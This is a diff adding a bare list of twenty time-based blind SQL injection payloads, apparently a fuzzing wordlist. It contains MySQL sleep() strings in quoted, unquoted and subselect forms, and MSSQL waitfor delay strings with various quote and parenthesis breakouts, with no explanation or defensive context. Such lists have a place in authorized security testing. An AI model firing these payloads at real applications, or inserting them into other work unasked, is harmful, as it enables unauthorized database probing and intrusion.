@@ -1,0 +1,20 @@
+sdadaddaaadsadsasdada' or sleep(1)=1 and '1'='1
+' or sleep(1)=1 and '1'='1
+' and sleep(1)=1 and '1'='1
+1 or sleep(1)=1 and 1=1
+1 and sleep(1)=1 and 1=1
+sdadaddaaadsadsasdada" or sleep(1)=1 and "1"="1
+" or sleep(1)=1 and "1"="1
+" and sleep(1)=1 and "1"="1
+(select(0)from(select(sleep(13)))v)/*'+
+(select(0)from(select(sleep(13)))v)+'\"+
+(select(0)from(select(sleep(13)))v)+\"*/
+orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
